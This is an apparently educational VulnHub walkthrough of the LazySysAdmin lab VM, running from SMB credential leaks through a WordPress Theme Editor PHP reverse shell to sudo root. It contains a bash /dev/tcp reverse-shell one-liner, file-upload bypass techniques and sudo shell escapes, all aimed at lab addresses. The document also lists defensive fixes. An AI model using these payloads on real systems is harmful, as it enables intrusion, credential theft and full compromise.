# LazySysAdmin: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | LazySysAdmin: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | Togie Mcdogie (@TogieMcdogie) |
| **Released** | 20 Sep 2017 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/lazysysadmin-1,205/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/lazysysadmin-1,205/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian/Ubuntu — Samba `4.3.11-Ubuntu`, Apache + WordPress) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **SMB enumeration** — using `enum4linux` and `smbclient` to list shares, usernames and files that should never have been shared.
- **Reading credentials out of a leaked config file** — `wp-config.php` handed over an SMB share.
- **Web reconnaissance** — spotting a second credential file (`deets.txt`) served by the web server.
- **WordPress login** — reusing the database password to reach the dashboard.
- **Foothold via a legitimate admin feature** — abusing the WordPress Theme Editor to run a PHP reverse shell.
- **Password reuse & weak passwords** — reusing the leaked password to pivot to a real user over SSH.
- **Linux privilege escalation** — finding a user in the `sudo` group with `(ALL : ALL) ALL` and using `sudo su` to become root.

> **Why this matters:** every step here maps to a real-world mistake — anonymous SMB access, secrets in config files, password reuse, and an over-privileged `sudo` rule. Those exact mistakes appear in production systems constantly.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts. Any of these work:


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

Or the quieter ping sweep:


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00042s latency).
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. `-sn` disables port scanning so the sweep is fast. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port and service scan

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 (Ubuntu)
|_http-title: LazySysAdmin
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
3306/tcp open  mysql       MySQL 5.7.19
6667/tcp open  irc         InspIRCd
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** there is a lot to attack here. Port 80 is a web server (likely WordPress), ports 139/445 are **SMB file sharing**, and port 3306 is MySQL. SMB is the juiciest lead — misconfigured shares are a classic first foothold.

![nmap service scan](images/02-nmap.png)

### 2.2 SMB enumeration — users and shares


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.101
```

```text
[+] Enumerating users using SID S-1-5-21-... and logon username '', password ''
S-1-5-21-...-1000 LAZYSYSADMIN\togie (Local User)
...
[+] Enumerating shares
//192.168.56.101/share$  Mapping: OK, Listing: OK
```

> **Why it works:** `enum4linux` wraps several Samba tools to pull users, groups and shares out of an SMB server that allows anonymous (NULL) sessions. It reveals a real username, **`togie`**, and a readable share called **`share$`**.

> **What is a NULL session?** An SMB session with an empty username and password. It is how SMB was designed to let machines browse each other, but it also lets unauthenticated attackers list accounts and shares. Anonymous access should be disabled.

![enum4linux SMB enumeration](images/03-smb-enum.png)

List the share, then connect to it:

```bash
smbclient -L //192.168.56.101 -N
smbclient //192.168.56.101/share$ -N
```


> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)

```text
smb: \> ls
  .                                   D        0  Mon Aug 21 09:09:31 2017
  ..                                  D        0  Mon Aug 21 09:09:31 2017
  deets.txt                           N      139  Mon Aug 21 09:09:14 2017
  index.html                          N     3570  Mon Aug 21 09:09:31 2017
  todolist.txt                        N      143  Mon Aug 21 09:09:31 2017
  wordpress                           D        0  Mon Aug 21 09:16:07 2017

smb: \wordpress\> ls
  wp-config.php                       N     2978  Mon Aug 21 09:15:11 2017
  ...
```

> **Why it works:** the `-N` flag means "no password" and connects anonymously. The share is world-readable and contains the entire WordPress install **including `wp-config.php`** — a file that holds the database credentials.

### 2.3 Stealing credentials from shared files

Download the config and the notes file:

```bash
smb: \wordpress\> get wp-config.php
smb: \> get deets.txt
smb: \> get todolist.txt
```

```bash
cat wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

```bash
cat deets.txt
```

```text
CBF Remembering all these passwords.
Remember to remove this file and update your password after we push out the server.
Password 12345
```

> **Why it works:** `wp-config.php` quite literally contains the database password (`TogieMYSQL12345^^`), and the admin's own notes file leaks a second, even weaker password (`12345`). Both files sit on a share anyone can read. This is the whole box in two files.

![wp-config.php and deets.txt on the SMB share](images/04-wp-config.png)

---

## 3. Foothold

### 3.1 Log into WordPress

Browse to `http://192.168.56.101/wordpress/wp-login.php` and try the credentials we recovered. WordPress admins often reuse the CMS database password, so try `admin` / `TogieMYSQL12345^^`:

- Username: `admin`
- Password: `TogieMYSQL12345^^`

> **Why it works:** the WordPress administrator installed the site and used the same password for the database and the admin account. It logs straight in and the user has **Administrator** rights.

![WordPress admin login succeeds](images/05-wp-admin-login.png)

### 3.2 Get a reverse shell through the Theme Editor

Administrators can edit theme PHP files from the browser, which means we can make the server execute our code.

1. Grab the well-known pentestmonkey reverse shell:


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

2. Edit the IP and port at the top to point at your Kali box:

```php
$ip   = '192.168.56.10'; // CHANGE THIS
$port = 4444;            // CHANGE THIS
```

3. In the dashboard go to **Appearance → Editor**, select the active theme (**Twenty Fifteen**), choose **`404.php`**, replace its entire contents with the shell, and click **Update File**.

> **Why it works:** the Theme Editor is a legitimate feature that lets admins edit PHP templates. A PHP template is executed server-side as the web user, so any code placed there runs on the target. Putting it in `404.php` means it fires whenever a page is *not found*.

4. Start a listener on Kali **before** triggering it:

```bash
nc -lvnp 4444
```

5. Trigger the shell by requesting a non-existent page (which loads `404.php`):

```bash
curl "http://192.168.56.101/wordpress/does-not-exist"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48712
Linux LazySysAdmin 4.4.0-31-generic #50-Ubuntu SMP ... x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

We have a shell as **`www-data`**. Upgrade it to a full interactive TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

> **Why it works:** a raw netcat shell has no job control and cannot handle interactive prompts like `su`. The `pty` spawn fixes that — you will need it in the next section.

![Reverse shell as www-data](images/06-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Pivot to the real user with the leaked password

`enum4linux` already told us the username **`togie`**, and `deets.txt` gave us the password **`12345`**. Reuse it.

```bash
su togie
# password: 12345
id
```

```text
uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
```

> **Why it works:** this is textbook **password reuse** — the same weak password the admin wrote down in `deets.txt` is Togie's real login password. Note the group list: `togie` is in **`sudo`**.

> **Tip:** you can also just SSH in directly once you have these credentials: `ssh togie@192.168.56.101`.

### 4.2 Abuse the `sudo` rule


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
Matching Defaults entries for togie on LazySysAdmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User togie may run the following commands on LazySysAdmin:
    (ALL : ALL) ALL
```

> **Why it works:** `(ALL : ALL) ALL` means Togie may run **any command as any user, including root**, and the password is the one we already have. There is no clever exploit needed — the misconfiguration is the exploit.

```bash
sudo su
# password: 12345
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 The root flag

```bash
cat /root/proof.txt
```

```text
WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
```

**Root flag captured.** (The proof file on this image is `/root/proof.txt`; the exact string is fixed by the released VM. Some rebuilds may name it `proof.txt` in `/root` only — check `ls -la /root` if you cannot find it.)

![sudo misconfiguration and root flag](images/07-privesc.png)

### Alternate privesc paths you may see in the wild

- Any SUID binary that has a shell escape (check `find / -perm -4000 -type f 2>/dev/null` and cross-reference [GTFOBins](https://gtfobins.github.io/)). This particular box does not rely on one, but it is the next thing to check.
- Reading `wp-config.php` again as `www-data` (it is normally readable by the web user) gives you the same DB password.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous (NULL) SMB sessions enabled | `smbd` on 139/445 | Username disclosure and share listing |
| 2 | World-readable SMB share with secrets | `//192.168.56.101/share$` | Leaks `wp-config.php` and `deets.txt` |
| 3 | Sensitive data in a config file | `wordpress/wp-config.php` | Database/admin password disclosure |
| 4 | Credentials written in plaintext notes | `deets.txt` | User password `12345` disclosure |
| 5 | Weak / reused password for WordPress admin | `wp-login.php` | Full CMS administrator access |
| 6 | Server-side code execution via Theme Editor | Appearance → Editor → `404.php` | Reverse shell as `www-data` |
| 7 | Password reuse on a system account | `togie` login (SSH/`su`) | Pivot from web shell to real user |
| 8 | Over-privileged `sudo` rule | `(ALL : ALL) ALL` for `togie` | Trivial full root compromise |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous SMB access** (`restrict anonymous = 2`, or require valid credentials) and remove the `share$` share entirely. File shares should be authenticated and least-privilege.
- **Never store secrets in plaintext**, especially not on a share. `wp-config.php` holds the DB password by design — so it must be readable only by the web server account, never exposed over SMB.
- **Rotate credentials after a compromise** and never write passwords into notes files. `deets.txt` should never have existed.
- **Enforce strong, unique passwords** for every account; prohibit reuse between the CMS, the database and the OS user.
- **Disable the WordPress theme/plugin editor** with `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`. This alone blocks the foothold.
- **Apply the principle of least privilege to `sudo`.** A web-ops user does not need `(ALL : ALL) ALL`; grant only the specific commands required.
- **Install a file-integrity monitor** so edits to `404.php`/theme files are detected, and alert on `www-data` spawning shells.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- LazySysAdmin: 1 on VulnHub — https://vulnhub.com/entry/lazysysadmin-1,205/
- Bladeism — "LazySysAdmin: 1 – Walkthrough" — https://blog.bladeism.com/lazysaamin-1-walkthrough
- Infosec Articles — "LazySysAdmin Vulnhub Walkthrough" — https://www.infosecarticles.com/lazysysadmin-vulnhub-walkthrough/
- btray900 — "lazysysadmin" walkthrough (GitHub) — https://github.com/btray900/lazysysadmin
- jckhmr.net — "Lazy Sysadmin Vulnhub Writeup" — https://www.jckhmr.net/lazy-sysadmin-vulnhub-writeup/
- pentestmonkey PHP reverse shell — https://github.com/pentestmonkey/php-reverse-shell
- GTFOBins — https://gtfobins.github.io/
- Samba security guidance — https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan (SSH, HTTP, SMB, MySQL, IRC).
- [ ] `images/03-smb-enum.png` — `enum4linux -a` output showing user `togie` and the `share$` share.
- [ ] `images/04-wp-config.png` — `wp-config.php` and `deets.txt` contents retrieved over SMB.
- [ ] `images/05-wp-admin-login.png` — successful WordPress admin login.
- [ ] `images/06-shell.png` — Theme Editor edit and the netcat shell as `www-data`.
- [ ] `images/07-privesc.png` — `sudo -l` showing `(ALL : ALL) ALL`, `id` as root, and `/root/proof.txt`.
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: anonymous SMB → readable `share$` → `wp-config.php` (DB password) + `deets.txt` (`12345`) → WordPress admin login → Theme Editor `404.php` reverse shell → shell as `www-data` → `su togie` (password `12345`) → `sudo -l` shows `(ALL : ALL) ALL` → `sudo su` → root → `/root/proof.txt`._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
